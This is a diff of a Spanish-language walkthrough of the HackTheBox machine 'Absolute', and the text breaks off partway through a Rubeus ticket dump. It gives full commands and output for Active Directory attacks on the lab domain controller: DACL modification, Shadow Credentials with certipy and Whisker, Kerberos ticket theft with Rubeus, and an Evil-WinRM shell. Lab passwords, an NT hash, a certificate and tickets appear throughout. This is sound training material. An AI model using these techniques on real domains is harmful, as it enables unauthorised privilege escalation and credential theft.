@@ -1,18 +1,27 @@
 ---
 title: "HackTheBox: Absolute"
 author: ace
-date: 2023-11-06 19:10 +0800
+date: 2023-11-08 19:10 +0800
 categories:
   - HTB
   - Insane
   - Windows
 tags:
   - ActiveDirectory
+  - Kerberos
+  - AS-RepRoast
+  - Windows
+  - impacket
+  - whisker
+  - rubeus
+  - pywhisker
+  - certipy
+  - krbrelay
 math: false
 mermaid: true
 image:
-  path: /assets/img/post/Absolute/Absolute.png 
-  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA 
+  path: /assets/img/post/Absolute/Absolute.png
+  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Absolute
 ---
 
@@ -26,6 +35,22 @@ image:
 
 ## Resumen
 
+Absolute es buana opción para aprender sobre Kerberos, ya que esta método de autenticación en AD desempeña un papel crucial en su resolución. A pesar de su inicial dificultad, especialmente si no estás familiarizado con Kerberos, la máquina se vuelve más abordable a medida que adquieres experiencia en esta área, al menos en su primera fase.
+
+Absolute y la máquina Scrambled son de los mejores recursos para explorar los conceptos relacionados con Kerberos. La temática que vamos a tocar hoy es la siguiente:
+
+- Enumeración de metadatos en imágenes.
+- Uso de **Username-Anarchy** para generar una wordlist que contenga posibles nombres de usuario
+- Ataque AS-REP Roast.
+- Autenticación a través de Kerberos.
+- Enumeración manual en Active Directory (AD).
+- Uso de Bloodhound para la enumeración.
+- Análisis dinámico de un binario compilado en Nim con Wireshark.
+- Explotación de DACL con `PowerView` y `dacl.py`
+- Shadow Credentials Attack con `certipy` y `Whisker`
+- KrbRelay Exploit.
+
+Dicho esto vamos al lío.
 ## nmap
 
 ```ruby
@@ -746,7 +771,7 @@ Habiendo transferido el binario a la máquina Windows, voy a ejecutarlo para ver
 
 ![img](/assets/img/post/Absolute/6.png)
 
-No veo ningún output ni ha ocurrido nada en especial cuando ejecuté el binario. Lo que voy a hacer es prender WireShark y voy a ver si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya  que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.
+No veo ningún output ni ha ocurrido nada en especial cuando ejecuté el binario. Lo que voy a hacer, antes de hacerle reversing, es prender WireShark y voy a comprobar si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.
 
 Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés.  Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente
 
@@ -771,7 +796,7 @@ Si inspeccionamos los paquetes podemos ver las credenciales del usuario `m.loveg
 
 ## Acceso Inicial
 
-El acceso inicial se puede conseguir de dos maneras usando PowerView o desde Linux con `impacket`. Voy a explicarlo de las dos maneras. Bajo mi punto de vista hacer pentesting de AD, es más sencillo en algunas tareas desde un host Windows, este caso es uno de ellas.
+Voy a explicar dos métodos diferentes para obtener acceso. Uno desde Windows y otro desde Linux. En Windows, utilizaremos  `PowerView`, `Rubeus` y `Whisker`, lo que resulta en un proceso más sencillo. En el caso de Linux, tendremos que realizar pasos adicionales, como descargar un script de Impacket llamado `dacledit`, que no se encuentra en la rama por defecto, y luego utilizar la herramienta `certipy-ad`.
 ### Enumerando el vector de ataque desde Bloodhound
 
 Primero vamos a comprobar que las credenciales capturadas por Wireshark sean válidas dentro del dominio.
@@ -785,34 +810,34 @@ SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:A
 
 Siendo válidas marcamos al usuario `m.lovegod` como `onwed` dentro de bloodhound, nos movemos a la pestaña de `Node` y hacemos click en `Reachable High Valuable Targets`
 
-![[Pasted image 20231107211121.png]]
+![img](/assets/img/post/Absolute/22.png)
 
-![[Pasted image 20231107211136.png]]
+![img](/assets/img/post/Absolute/23.png)
 El resultado de la query nos muestra un camino para convertirnos en el usuario `winrm_user`, el cual tiene la capacidad de crear una conexión remota en el equipo. 
 
-![[Pasted image 20231107211230.png]]
+![img](/assets/img/post/Absolute/24.png)
 
 Si vemos los grupos a los que pertenece `winrm_user`, vemos que es miembro de `Remote Management Users`, lo cual quiere decir que con las credenciales de este usuario podemos conectarnos mediante el servicio de la administación remota de Windows (WinRM) al DC.
 
-![[Pasted image 20231107211614.png]]
+![img](/assets/img/post/Absolute/25.png)
 
 Vamos por partes, primero vamos a hacer click en `Owns`, para ver que podemos hacer
 
-![[Pasted image 20231107212001.png]]
+![img](/assets/img/post/Absolute/26.png)
 
-![[Pasted image 20231107212104.png]]
+![img](/assets/img/post/Absolute/27.png)
 
 Bloodhound nos dice, que el usuario `m.lovegod` es dueño del grupo `NetWork Audit`, lo cual quiere decir que como propietario, puede cambiar la configuración de seguridad del grupo, incluso si existen unos permisoos establecidos por DACLs. Es decir podemos hacer lo que queramos con este grupo. 
 
 Seguidamente vemos que los miembros de `Network Audit` poseen un `GenericWrite` sobre el usuario `winrm_user`
 
-![[Pasted image 20231107212427.png]]
+![img](/assets/img/post/Absolute/28.png)
 
-![[Pasted image 20231107212523.png]]
+![img](/assets/img/post/Absolute/29.png)
 
 Esto quiere decir que podemos escribir atribustos específicos del usuario `winrm_user` como miembros de este grupo, pudiendo crear SPNs, es decir hacer el usuario Kerberoesteable y luego con impacket o rubeus obtener el ticket del usuario con su contraseña cifrada. En este caso si nos vamos la pestaña `Linux Abuse` , vemos un ataque extra que es el **Shadow Credentials Attack**
 
-![[Pasted image 20231107213009.png]]
+![img](/assets/img/post/Absolute/30.png)
 
 Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredentialLink` del objeto usuario/ordenador de destino y luego realizar la autenticación Kerberos como esa cuenta utilizando `PKINIT`. 
 
@@ -821,16 +846,13 @@ Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredenti
 En este enlace se explica como realizar este ataque, y las condiciones necesarias que se deben de tener para que funcione:  
 [Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 
-### Método 1: Desde Linux
+### Añadiendo a m.lovegood a Network Audit
 
-Bien desde aquí podemos hacer dos cosas, usar PowerView o estar con Window
+Como mencionamos anteriormente, el usuario `mv.lovegod` tiene permisos `FullControl` sobre el grupo `Network Audit`. Por lo tanto, nuestra estrategia implica modificar la DACL para poder agregarlo a dicho grupo.
+#### Método 1: Desde Linux
 
-```bash
-❯ cme smb 10.129.68.75 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k
-SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
-SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
-```
-{: .nolineno }
+Nos clonamos la rama de `dacledit` en nuestro sistema.
+
 ```bash
 ❯ git clone https://github.com/ShutdownRepo/impacket -b dacledit
 Cloning into 'impacket'...
@@ -842,11 +864,17 @@ Receiving objects: 100% (24084/24084), 9.82 MiB | 6.68 MiB/s, done.
 Resolving deltas: 100% (18353/18353), done.
 ```
 {: .nolineno }
+
+Para no causar confictos con mi versión de impacket, creare un entorno virtual con python
+
 ```bash
 ❯ python3 -m venv .venv
 ❯ source .venv/bin/activate
 ```
 {: .nolineno }
+
+Instalamos impacket en el entorno
+
 ```bash
 ❯ pip3 install .
 Processing /home/alex/HTB/Absolute/content/impacket
@@ -858,8 +886,10 @@ Collecting pyasn1>=0.2.3 (from impacket==0.9.25.dev1+20230823.145202.4518279)
 ```
 {: .nolineno }
 
+Después de completar estos pasos, ejecutamos el script `dacledity.py`, especificando la variable de entorno `KRB5CCNAME` para que apunte al ticket que generamos previamente. Esto se debe a que, por defecto, Impacket busca un archivo .ccache para la autenticación y en este caso lo hemos generado con kinit.
+
 ```bash
-❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
+❯ KRB5CCNAME=/tmp/krb5cc_1000 ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
 Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation
 
 [*] DACL backed up to dacledit-20231106-192332.bak
@@ -867,94 +897,24 @@ Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corpor
 ```
 {: .nolineno }
 
-```bash
-❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
-Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation
+Ahora vamos a añadir el usuario al grupo con `net rpc`.
 
-[*] DACL backed up to dacledit-20231106-194043.bak
-[*] DACL modified successfully!
+```bash
 ❯ net rpc group addmem "Network Audit" -U m.lovegod -S dc.absolute.htb -k m.lovegod
-WARNING: The option -k|--kerberos is deprecated!
 ```
 {: .nolineno }
 
-```bash
-❯ cat /etc/krb5.conf
-
-[libdefaults]
-    default_realm = ABSOLUTE.HTB
-
-
-[realms]
-
-    ABSOLUTE.HTB= {
-        kdc = dc.absolute.htb
-        admin_server = dc.absolute.htb
-        default_domain = absolute.htb
-
-    }
-
-
-[domain_realm]
-    .absolute.htb = ABSOLUTE.HTB
-    absolute.htb = ABSOLUTE.HTB
-```
-
+No vemos ningún output. Podemos comprobar que el usuario se ha añadido correctamente con la opción `members` de `net rpc`
 
 ```bash
-❯ kinit m.lovegod
-Password for m.lovegod@ABSOLUTE.HTB: 
+❯ net rpc group members "Network Audit" -U m.lovegod -S dc.absolute.htb --use-kerberos=required
+Password for [WORKGROUP\m.lovegod]:
+absolute\m.lovegod
+absolute\svc_audit
 ```
-{: .nolineno }
-```bash
-❯ klist
-Ticket cache: FILE:/tmp/krb5cc_1000
-Default principal: m.lovegod@ABSOLUTE.HTB
+#### Método 2: Desde Windows
 
-Valid starting     Expires            Service principal
-11/06/23 19:38:56  11/06/23 23:38:56  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
-	renew until 11/06/23 23:38:56
-11/06/23 19:39:07  11/06/23 23:38:56  cifs/dc.absolute.htb@ABSOLUTE.HTB
-	renew until 11/06/23 23:38:56
-```
-{: .nolineno }
-```bash
-❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
-                                        
-Evil-WinRM shell v3.5
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Warning: User is not needed for Kerberos auth. Ticket will be used
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
-absolute\winrm_user
-*Evil-WinRM* PS C:\Users\winrm_user\Documents> ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0 3:
-
-   Connection-specific DNS Suffix  . : .htb
-   IPv6 Address. . . . . . . . . . . : dead:beef::19c
-   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
-   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
-   IPv4 Address. . . . . . . . . . . : 10.129.68.75
-   Subnet Mask . . . . . . . . . . . : 255.255.0.0
-   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
-                                       10.129.0.1
-```
-{: .nolineno }
-
-### Método 2: Desde Windows
-
-![img](/assets/img/post/Absolute/15.png)
-
-Bien ahora tenemos que crear una sesión como `m.lovegod`. Como la autenticación por NTLM está desactivada, usaré Kerberos para hacerlo. Para ello haré uso de `rubeus.exe`, generaré un ticket 
+El proceso anterior es mucho más sencillo desde una máquina Windows. El primer paso será generar una sesión para el usuario `m.lovegod`, como la autenticación NTLM está desactivada, lo haré mediante Kerberos. Para ello haré uso de `Rubeus.exe`
 
 ```
 PS C:\users\alex\desktop\HTB> C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes256
@@ -1018,6 +978,8 @@ PS C:\users\alex\desktop\HTB> C:\tools\Rubeus.exe asktgt /user:m.lovegod /passwo
 PS C:\users\alex\desktop\HTB>
 ```
 
+LIstamos los tickets y vemos que se ha importado correctamente.
+
 ```
 PS C:\users\alex\desktop\HTB> klist
 
@@ -1048,6 +1010,7 @@ Vales almacenados en caché: (2)
         KDC llamado: dc.absolute.htb
 ```
 
+Podemos comprobarlo listando los recursos compartidos del DC.
 
 ```
 PS C:\users\alex\desktop\HTB> dir \\dc.absolute.htb\shared
@@ -1063,28 +1026,37 @@ Mode                 LastWriteTime         Length Name
 
 ```
 
+Bien para llevar a cabo este ataque según explica bloodhound, es necesario tener importado Powerview
+
 ```
 PS C:\users\alex\desktop\HTB> Import-Module \tools\PowerView.ps1
 ```
 
+Una vez echo esto vamos a añadirnos al grupo `Network Audit` con el siguente comando. En este caso el parámetro `-Credential` no es necesario de usar, ya que disponemos un ticket de kerberos perteneciente al usuario `m.lovegod`, por lo que no hace falta crear ningún objeto `PSCredential`.
+
 ```
-PS C:\users\alex\desktop\HTB> Add-DomainObjectAcl -TargetIdentity "Network Audit" -Rights WriteMembers -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
+PS C:\users\alex\desktop\HTB> Add-DomainObjectAcl -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
 ```
 
-![img](/assets/img/post/Absolute/16.png)
+Disponiendo de todos los permisos sobre el grupo, voy a añadir el usuario `m.lovegod` al grupo `Network Audit`
+
+```
+PS C:\Users\Alex> Add-DomainGroupMember -Identity "Network Audit" -Member m.lovegod -Domain "absolute.htb"
+```
 
 ![img](/assets/img/post/Absolute/17.png)
 
+Si vemos los miembros del grupo `Network Audit` vemos que `m.lovegod` se ha añadido correctamente.
 
-![img](/assets/img/post/Absolute/19.png)
+![img](/assets/img/post/Absolute/31.png)
 
-### Shadow Credentials
+### Shadow Credentials Attack
 
-```bash
-❯ kdestroy
-❯ kinit m.lovegod
-Password for m.lovegod@ABSOLUTE.HTB:
-```
+#### Desde Linux: Certipy-AD
+
+Este ataque se puede realiza usando `pyWhisker` o `certipy-ad`. En este caso lo voy a hacer con certipy, ya que el proceso es mucho más sencillo.
+
+Con el siguiente comando automatizamos todo el proceso, obtiendo como resultado el hash del usuario `winrm_user` y el TGT, en formato ccache.
 
 ```bash
 ❯ KRB5CCNAME=/tmp/krb5cc_1000 certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
@@ -1108,16 +1080,17 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
 
+Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano., cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.
+
 ```
 ❯ ls *.ccache
- winrm_user.ccache
+winrm_user.ccache
 ```
 
-
-#### WinRM - Linux
+Usaré `Evil-WinRM`. Para conectarnos usando Kerberos debemos indicar como variable de entorno, el fichero `.ccache` perteneciente al usuario, e indicar el `realm`, es decir el nombre del dominio. También es importante indicar en lugar de la IP, el FQDN del DC, ya que Kerberos es especialillo y no le suelen gustar las IPs.
 
 ```bash
-❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -u winrm_user -r absolute.htb
+❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
                                         
 Evil-WinRM shell v3.5
                                         
@@ -1138,33 +1111,110 @@ Windows IP Configuration
 Ethernet adapter Ethernet0 3:
 
    Connection-specific DNS Suffix  . : .htb
-   IPv6 Address. . . . . . . . . . . : dead:beef::11e
-   IPv6 Address. . . . . . . . . . . : dead:beef::701c:5194:8596:b43b
-   Link-local IPv6 Address . . . . . : fe80::701c:5194:8596:b43b%11
-   IPv4 Address. . . . . . . . . . . : 10.129.229.59
+   IPv6 Address. . . . . . . . . . . : dead:beef::19c
+   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
+   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
+   IPv4 Address. . . . . . . . . . . : 10.129.68.75
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                        10.129.0.1
-*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
 ```
+{: .nolineno }
 
+#### Desde Windows: Whisker
 
-#### WinRM: Windows
+Bien este mismo ataque lo podemos hacer desde Windows con [Whisker](https://github.com/eladshamir/Whisker). Nos clonamos el repositorio y lo compilamos desde **Visual Studio Code**.
 
-```
-❯ impacket-ticketConverter winrm_user.ccache winrm_user.kirbi
-Impacket v0.11.0 - Copyright 2023 Fortra
+![img](/assets/img/post/Absolute/32.png)
 
-[*] converting ccache to kirbi...
-[+] done
-```
+Antes de continuar. Existe una tarea programada en la máquina que hace, que cada ciertos minutos se borre la DACL, que anteriormente hemos modifcado. Por lo que nuestro usuario será eliminado del grupo `New Audit` y no podremos realizar este ataque con éxito. Así que cada cierto tiempo hay que volver a ejecutar los comandos anteriores para añadir el usuario al grupo mientras realizamos el ataque. Otra cosa importante es que cuando nosotros añadimos el usuario al grupo, el ticket, del que disponemos no guarda esa información o almenos es mi conclusión por que el ataque no funcionaba. Mi consejo es que regenereis el ticket una vez hayais añadido el usuario al grupo. Esto se hace de la siguente manera:
 
 ```
-PS C:\Users\Alex\Desktop\HTB\Absolute> C:\Users\Alex\Desktop\tools\Rubeus.exe renew /ticket:winrm_user.kirbi /ptt
+klist purge
+C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes128
 ```
 
-![img](/assets/img/post/Absolute/19.png)
+Bien con el ticket bueno en memoria vamos a realizar el ataque
 
+```
+PS C:\Users\Alex> C:\tools\Whisker.exe add /domain:absolute.htb /target:winrm_user /user:m.lovegod /dc:dc.absolute.htb
+```
+
+![img](/assets/img/post/Absolute/33.png)
+
+El output de **Whisker** nos dice que ejecutemos el siguiente comando con **Rubeus** para obtener el hash NTLM y TGT del usuario `winrm_user`. 
+
+Al comando que indica Whisker, le voy a añadir el parámetro `/ptt`, para inyectar el ticket en memoria. Obtenemos el hash NTLM del usuario sí, pero si recordamos bien, la autenticación esta configurada para que solamente funcione por Kerberos y un Pass-The-Hash no va a funcionar. Aun así podríamos intentar crackear el hash NTLM , y descubrir la contraseña, en este caso no pude romper el hash.  
+
+```
+PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:winrm_user /certificate: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 /password:"nC38msY6DYWxnRBx" /domain:absolute.htb /dc:dc.absolute.htb /getcredentials /showPS /ptt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=winrm_user
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\winrm_user'
+[*] Using domain controller: 10.129.142.54:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGTjCCBkqgAwIBBaEDAgEWooIFYTCCBV1hggVZMIIFVaADAgEFoQ4bDEFCU09MVVRFLkhUQqIhMB+g
+      AwIBAqEYMBYbBmtyYnRndBsMYWJzb2x1dGUuaHRio4IFGTCCBRWgAwIBEqEDAgECooIFBwSCBQOisBrl
+      lm8r9A3SuQqtIVBkObuhVEhK4Rm44oDlQs9WKOPzgBUPMEXY7F0V5lGpJZiSHBEi38hYWgYZgCMW/ppk
+      55u78vvl4xtt9UCAYTDxRWmQtv+hduSHsUrxGoMaQdpKWiPs52H7UavitZuxvcuSCeMqGk4m4+SuzKxk
+      UTsLi12Pa94W2E0lsO8BEWpLcCGqEgxE98T/iicrzo5pWfu+Q3qve4cFUHUQ3hLxXSy89dOgN0L7kbqx
+      E2j2x96qnGduJp0jikz1O1cwPMPFOBfs0lvzHXkoFr1qNmwGuYwrA1ugDMOQNIeu/PEz3WNb8762Jrd9
+      WBku9LqhzrFTRin0ouhK75lDCii8OqeqbmVjZb3kSyambkdVvOxxAMcP+Nj4j4Tt+LV9yDJ6rRQpY7v1
+      Hd0haFsUBfOEh28yOKX84WfiE6ATu9BQuhnepnggma7+IDEqO+MKxeABWD62jp15hr+bxvxb5fDdQHUK
+      ymxtv2xh1OFqAnduCVts1u8TtGlr1BOX/R/jnNy7Rm5mU65WX4H/wrqbC2HSazMPiBGZM4IfGsEOJquF
+      nGnSQR59+IIwWXTz/WGHnVnw3rtbv7g5LgeLq0qMgJ9ePSzFcKMsc14hkj2pjxOXwDmjfUKwwZSQ+zf2
+      jtnhn24RK6zqdDEEP/4/fOmMOMBiBhbk/enibN1IDw5Wn+YGy59K/n2jc6mEKp12PgOtC2/HHnuP2Jz+
+      wuaCpb98yuK3jOH6ncQgcagVV7KAns/nn0N3jzpAe6LSVpVpqa9UuleUlTgN29vC0HqOo+NS7XoEw1QH
+      oQcUkYuUEzltoXb4q1crlYKMK0wnpJdLMdiwslAYyzQzZiPNeRF48G0rfGhv/JuN5hdj9IhqFswQOhh8
+      npQ0Rl8zmdvDJMHMpHOwCytVsN/v5/acVz/jldhdieArOzP2duJlONo/aL7Ss7gVql8xKaz6F8rQDyuf
+      QtJS2TjisO/OUrG6rsisdKVnRdu9aEF8R4d+YPfw4nO3YEoQjLYh9NOI6FMfG1Q55XCXN9jjMqkFdSjt
+      SlQzd24P1lczbIAdmLgPrqIZGtiKMy3XGJfmiRSf0ZDfG6FABBP9GMrv28YmWMgOmu7Bi0j1iT3IhYef
+      5miEM2Cq/vMN7QD9uENyvNi9y37JGQ6y4GbPxF9OyVB2t20zgWlMJDbLBL+sS5lnKFOwoyQQbN2lQo9i
